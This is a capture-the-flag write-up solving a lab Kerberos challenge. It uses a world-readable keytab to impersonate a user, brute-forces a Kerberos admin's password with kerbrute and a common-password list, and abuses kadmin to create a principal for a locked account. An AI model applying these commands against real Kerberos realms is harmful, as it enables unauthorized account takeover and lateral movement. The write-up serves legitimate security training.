# three-headed-doggo-protocol

[library.m0unt41n.ch/challenges/three-headed-doggo-protocol](https://library.m0unt41n.ch/challenges/three-headed-doggo-protocol) ![](../../resources/misc.svg) ![](../../resources/medium.svg) 

# TL;DR

We get shell access to a remote system. The challenge name makes it obvious we'll be dealing with Kerberos &#128578;

# bob@workstation1

First step is to login via ssh with the user bob and password bob 

```
$ ssh bob@library.m0unt41n.ch -p 31529
bob@library.m0unt41n.ch's password: <bob>
bob@workstation1:~$ ls -la
(...)
-rw-r--r-- 1 root root  433 Sep  7 16:12 notes.txt

bob@workstation1:~$ cat notes.txt 
So General Management LLC now uses Kerberos Authentication for having SSO for their linux servers.
Realm: CHALLENGE-DAF98FA3-34A9-4E5E-81F7-78BDD19DC6FE.SVC.CLUSTER.LOCAL
I can now just ssh into workstation2.CHALLENGE-DAF98FA3-34A9-4E5E-81F7-78BDD19DC6FE.SVC.CLUSTER.LOCAL with my user:
ssh bob@workstation2.CHALLENGE-DAF98FA3-34A9-4E5E-81F7-78BDD19DC6FE.SVC.CLUSTER.LOCAL
And it works!!! (Strictly use hostnames, don't use IPs)
```

Sanity check of the Kerberos principal:

```
bob@workstation1:~$ klist
Ticket cache: FILE:/tmp/krb5cc_999_rNb40A4L0V
Default principal: bob@CHALLENGE-DAF98FA3-34A9-4E5E-81F7-78BDD19DC6FE.SVC.CLUSTER.LOCAL

Valid starting     Expires            Service principal
09/07/24 16:13:46  09/08/24 02:13:46  krbtgt/CHALLENGE-DAF98FA3-34A9-4E5E-81F7-78BDD19DC6FE.SVC.CLUSTER.LOCAL@CHALLENGE-DAF98FA3-34A9-4E5E-81F7-78BDD19DC6FE.SVC.CLUSTER.LOCAL
	renew until 09/08/24 16:13:46
```

# bob@workstation2

We follow the instructions:

```
bob@workstation1:~$ ssh bob@workstation2
<no password needed>

bob@workstation2:~$ ls -la
(...)
-rw-r--r-- 1 root root   48 Jun  3 11:41 notes.txt

bob@workstation2:~$ cat notes.txt 
I need to brief peter to keep his account safe.
```

Who is that `peter` guy?

```
bob@workstation2:~$ id -a peter
uid=995(peter) gid=994(peter) groups=994(peter)

bob@workstation2:~$ ls -la /home/peter
ls: cannot open directory '/home/peter': Permission denied

bob@workstation2:~$ ls -lad /home/peter
drwxr-x--- 1 peter peter 4096 Sep  7 16:12 /home/peter

bob@workstation2:~$ find / -user peter 2>/dev/null
/home/peter

bob@workstation2:~$ find / -name '*peter*' 2>/dev/null
/home/peter
/etc/peter.keytab

bob@workstation2:~$ ls -la /etc/peter.keytab
-rwxrwxrwx 1 root root 130 Sep  7 16:12 /etc/peter.keytab

Keytab name: FILE:/etc/peter.keytab
KVNO Principal
---- --------------------------------------------------------------------------
   1 peter@CHALLENGE-DAF98FA3-34A9-4E5E-81F7-78BDD19DC6FE.SVC.CLUSTER.LOCAL
```

A-ha! We have `peter`'s keytab and it contains his login credential.

# peter@workstation2

```
bob@workstation2:~$ kinit -k -t /etc/peter.keytab peter@CHALLENGE-DAF98FA3-34A9-4E5E-81F7-78BDD19DC6FE.SVC.CLUSTER.LOCAL

bob@workstation2:~$ klist
(...)
Default principal: peter@CHALLENGE-DAF98FA3-34A9-4E5E-81F7-78BDD19DC6FE.SVC.CLUSTER.LOCAL

bob@workstation2:~$ ssh peter@workstation2
<no password needed>

peter@workstation2:~$ ls -la
(...)
-rw-r--r-- 1 root  root   120 Sep  7 16:12 notes.txt
peter@workstation2:~$ cat notes.txt 
TODO:
- Fix issue on server1.CHALLENGE-DAF98FA3-34A9-4E5E-81F7-78BDD19DC6FE.SVC.CLUSTER.LOCAL
- Make coffee
- Meet bob
```

It's almost too easy, we're pretty much told next steps all the time &#128578;

# peter@server1

```
peter@workstation2:~$ ssh server1
<no password needed>

peter@server1:~$ ls -la
(...)
-rw-r--r-- 1 root  root   114 Jun  3 11:41 notes.txt

peter@server1:~$ cat notes.txt 
anna has an insecure password and probably used one of the 10k-most-common passwords...
anna is a kerberos admin!
```

What else do we know about `anna`?

```
peter@server1:~$ id -a anna
uid=995(anna) gid=994(anna) groups=994(anna)

peter@server1:~$ find / -user 'anna' 2>/dev/null
/home/anna

peter@server1:~$ ls -lad /home/anna
drwxr-x--- 1 anna anna 4096 Jun  3 11:43 /home/anna

peter@server1:~$ find / -name '*anna*' 2>/dev/null
/home/anna
/usr/share/terminfo/a/annarbor4080
```

But, the hint in `notes.txt` is pretty explicit. Let's do just that

## Brute-forcing anna's password

First, the list, [easy to find one](http://google.com/search?q=10k-most-common+passwords):

```
peter@server1:~$ wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10k-most-common.txt
```

While I did work in Kerberized environments before, I actually never tried bruteforcing it,
but [Google to the rescue](http://google.com/search?q=crack+kerberos+account+brute+force).

Out of many results, let's pick 
[github.com/ropnop/kerbrute](http://github.com/ropnop/kerbrute), as it has self-contained binary.

```
peter@server1:~$ uname -i
x86_64

peter@server1:~$ wget https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_linux_amd64

peter@server1:~$ chmod a+x kerbrute_linux_amd64
```

And crack the password of `anna`

```
peter@server1:~$ ./kerbrute_linux_amd64 --help
(...)
  bruteuser     Bruteforce a single user's password from a wordlist

peter@server1:~$ ./kerbrute_linux_amd64 bruteuser --help
Usage:
  kerbrute bruteuser [flags] <password_list> username
(...)
      --dc string       The location of the Domain Controller (KDC) to target. If blank, will lookup via DNS
  -d, --domain string   The full domain to use (e.g. contoso.com)
  -o, --output string   File to write logs to. Optional.
      --safe            Safe mode. Will abort if any user comes back as locked out. Default: FALSE
  -t, --threads int     Threads to use (default 10)
  -v, --verbose         Log failures and errors

peter@server1:~$ cat /etc/krb5.conf 
(...)
  kdc = kerberos.CHALLENGE-DAF98FA3-34A9-4E5E-81F7-78BDD19DC6FE.SVC.CLUSTER.LOCAL

peter@server1:~$ ./kerbrute_linux_amd64 --safe -d CHALLENGE-DAF98FA3-34A9-4E5E-81F7-78BDD19DC6FE.SVC.CLUSTER.LOCAL --dc kerberos.CHALLENGE-DAF98FA3-34A9-4E5E-81F7-78BDD19DC6FE.SVC.CLUSTER.LOCAL bruteuser 10k-most-common.txt anna
(...)
2024/09/07 16:34:34 >  [+] VALID LOGIN:	 anna@CHALLENGE-DAF98FA3-34A9-4E5E-81F7-78BDD19DC6FE.SVC.CLUSTER.LOCAL:annabell
```

So, password of `anna` is **`annabell`**

# anna@server1

The known pattern continues:

```
peter@server1:~$ ssh anna@server1
anna@server1's password: 

anna@server1:~$ ls -la
(...)
-rw-r--r-- 1 root root   15 Jun  3 11:41 notes.txt

anna@server1:~$ cat notes.txt 
TODO: get flag
```

At this point I got slightly stuck, as I thought the flag will be hidden somewhere in Kerberos
(so, I tried things like `listprincs`, `get_strings` in `kadmin` etc.

But, it ended up simpler than that - there is a `flag` user:

```
anna@server1:~$ find / -name '*flag*' 2>/dev/null
(...)
/home/flag

anna@server1:~$ ls -lad /home/flag
drwxr-x--- 1 flag flag 4096 Jun  3 11:43 /home/flag

anna@server1:~$ id -a flag
uid=994(flag) gid=993(flag) groups=993(flag)
```

The `flag` user is locked, but, we are Kerberos admin, so, we can set the password.

From previous step (`listprincs`) I knew that the `flag` user actually does not have a principal, so we can create one:

```
anna@server1:~$ kadmin
Authenticating as principal anna/admin@CHALLENGE-DAF98FA3-34A9-4E5E-81F7-78BDD19DC6FE.SVC.CLUSTER.LOCAL with password.
Password for anna/admin@CHALLENGE-DAF98FA3-34A9-4E5E-81F7-78BDD19DC6FE.SVC.CLUSTER.LOCAL: 
kadmin:  addprinc flag@CHALLENGE-DAF98FA3-34A9-4E5E-81F7-78BDD19DC6FE.SVC.CLUSTER.LOCAL
No policy specified for flag@CHALLENGE-DAF98FA3-34A9-4E5E-81F7-78BDD19DC6FE.SVC.CLUSTER.LOCAL; defaulting to no policy
Enter password for principal "flag@CHALLENGE-DAF98FA3-34A9-4E5E-81F7-78BDD19DC6FE.SVC.CLUSTER.LOCAL": <new pass>
Re-enter password for principal "flag@CHALLENGE-DAF98FA3-34A9-4E5E-81F7-78BDD19DC6FE.SVC.CLUSTER.LOCAL": <new pass>
Principal "flag@CHALLENGE-DAF98FA3-34A9-4E5E-81F7-78BDD19DC6FE.SVC.CLUSTER.LOCAL" created.
```

# flag@server1

With that, we can login as `flag`

```
anna@server1:~$ ssh flag@server1
flag@server1's password: <new pass>

flag@server1:~$ ls -la
(...)
-rw-r--r-- 1 root root   35 Jun  3 11:41 flag.txt

flag@server1:~$ cat flag.txt 
```

---

## `shc2024{k3rb3r0s_l4t3r4l_m0v3m3nt}`


<hr>

&copy; [muflon77](https://library.m0unt41n.ch/players/805ae1c8-9fe4-5816-b4a4-5057fa6eedb1)
